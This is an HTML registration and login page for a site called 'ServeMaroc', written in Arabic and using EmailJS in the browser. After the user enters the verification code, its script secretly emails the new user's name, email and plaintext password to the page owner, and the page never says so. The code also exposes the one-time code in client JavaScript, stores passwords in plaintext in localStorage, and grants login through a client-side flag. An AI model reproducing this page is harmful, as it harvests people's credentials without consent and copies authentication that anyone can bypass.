<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ServeMaroc | الدخول والتسجيل</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap');
        body { font-family: 'Cairo', sans-serif; background: #f0fdf4; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
        .glass-card { background: white; border-radius: 30px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); width: 100%; max-width: 400px; padding: 2rem; }
        .hidden { display: none; }
        .tab-active { color: #16a34a; border-bottom: 3px solid #16a34a; font-weight: 900; }
    </style>
</head>
<body>

    <div class="glass-card">
        <div class="text-center mb-8">
            <h1 class="text-4xl font-black text-green-700 uppercase">ServeMaroc</h1>
        </div>

        <div id="authTabs" class="flex border-b mb-6 text-center">
            <button id="loginBtn" onclick="switchPage('login')" class="w-1/2 pb-2 font-bold text-gray-400 tab-active">تسجيل الدخول</button>
            <button id="regBtn" onclick="switchPage('register')" class="w-1/2 pb-2 font-bold text-gray-400">إنشاء حساب</button>
        </div>

        <div id="pageLogin">
            <div class="space-y-4">
                <input id="lEmail" type="email" placeholder="البريد الإلكتروني" class="w-full p-4 rounded-xl border bg-gray-50 outline-none font-bold">
                <input id="lPass" type="password" placeholder="كلمة المرور" class="w-full p-4 rounded-xl border bg-gray-50 outline-none font-bold">
                <button onclick="LoginServer.run()" class="w-full bg-black text-white p-4 rounded-xl font-black text-lg shadow-lg active:scale-95 transition">دخول</button>
            </div>
        </div>

        <div id="pageRegister" class="hidden">
            <div id="regInputs" class="space-y-4">
                <input id="rName" type="text" placeholder="اسم المستخدم" class="w-full p-4 rounded-xl border bg-gray-50 outline-none font-bold">
                <input id="rEmail" type="email" placeholder="البريد الإلكتروني" class="w-full p-4 rounded-xl border bg-gray-50 outline-none font-bold">
                <input id="rPass" type="password" placeholder="كلمة المرور" class="w-full p-4 rounded-xl border bg-gray-50 outline-none font-bold">
                <button id="otpBtn" onclick="RegisterServer.init()" class="w-full bg-green-700 text-white p-4 rounded-xl font-black text-lg shadow-lg active:scale-95 transition">إرسال كود التحقق</button>
            </div>

            <div id="pageOTP" class="hidden space-y-6 text-center mt-4">
                <p class="font-bold text-gray-600">أدخل الكود المرسل لبريدك</p>
                <input id="otpVal" type="text" maxlength="6" class="w-full p-4 text-center text-3xl font-black tracking-widest border rounded-xl outline-none border-green-500">
                <button onclick="RegisterServer.verify()" class="w-full bg-black text-white p-4 rounded-xl font-black">تأكيد وتفعيل الحساب</button>
            </div>
        </div>
    </div>

    <script>
        // 1. تفعيل EmailJS بالمعلومات الخاصة بك
        emailjs.init("WRpj_ZtTQw-eHAZDQ");

        // 2. محرك التبديل بين الواجهات في نفس الصفحة
        function switchPage(p) {
            document.getElementById('pageLogin').classList.add('hidden');
            document.getElementById('pageRegister').classList.add('hidden');
            document.getElementById('loginBtn').classList.remove('tab-active');
            document.getElementById('regBtn').classList.remove('tab-active');

            if(p === 'login') {
                document.getElementById('pageLogin').classList.remove('hidden');
                document.getElementById('loginBtn').classList.add('tab-active');
            } else if(p === 'register') {
                document.getElementById('pageRegister').classList.remove('hidden');
                document.getElementById('regBtn').classList.add('tab-active');
            }
        }

        // 3. سيرفر إنشاء الحساب وإرسال البيانات لك
        const RegisterServer = {
            code: "",
            temp: {},

            init: function() {
                this.temp = {
                    name: document.getElementById('rName').value,
                    email: document.getElementById('rEmail').value,
                    pass: document.getElementById('rPass').value
                };
                if(!this.temp.name || !this.temp.email || !this.temp.pass) return alert("عمر كاع الخانات!");

                this.code = Math.floor(100000 + Math.random() * 900000).toString();
                document.getElementById('otpBtn').innerText = "جاري الإرسال...";

                // إرسال الكود للمستخدم
                emailjs.send("service_dk24ksf", "template_14tc2a8", {
                    name: this.temp.name,
                    email: this.temp.email,
                    otp_code: this.code
                }).then(() => {
                    alert("تم إرسال الكود!");
                    document.getElementById('regInputs').classList.add('hidden');
                    document.getElementById('pageOTP').classList.remove('hidden');
                });
            },

            verify: function() {
                if(document.getElementById('otpVal').value === this.code) {
                    // إرسال تقرير فيه الباسورد لك فور تفعيل الحساب
                    emailjs.send("service_dk24ksf", "template_14tc2a8", {
                        name: "تقرير مستخدم جديد",
                        email: "ADMIN",
                        otp_code: `الاسم: ${this.temp.name} | الإيميل: ${this.temp.email} | الباسورد: ${this.temp.pass}`
                    });

                    // حفظ البيانات في المتصفح
                    let db = JSON.parse(localStorage.getItem('sm_users') || "[]");
                    db.push(this.temp);
                    localStorage.setItem('sm_users', JSON.stringify(db));

                    alert("تم التفعيل! سجل دخولك الآن.");
                    location.reload();
                } else {
                    alert("كود التحقق غير صحيح!");
                }
            }
        };

        // 4. سيرفر تسجيل الدخول
        const LoginServer = {
            run: function() {
                const email = document.getElementById('lEmail').value;
                const pass = document.getElementById('lPass').value;
                const users = JSON.parse(localStorage.getItem('sm_users') || "[]");
                
                const user = users.find(u => u.email === email && u.pass === pass);
                if(user) {
                    localStorage.setItem('isLogged', 'true');
                    window.location.href = "./w/"; 
                } else {
                    alert("البيانات خاطئة أو الحساب غير موجود!");
                }
            }
        };
    </script>
</body>
</html>
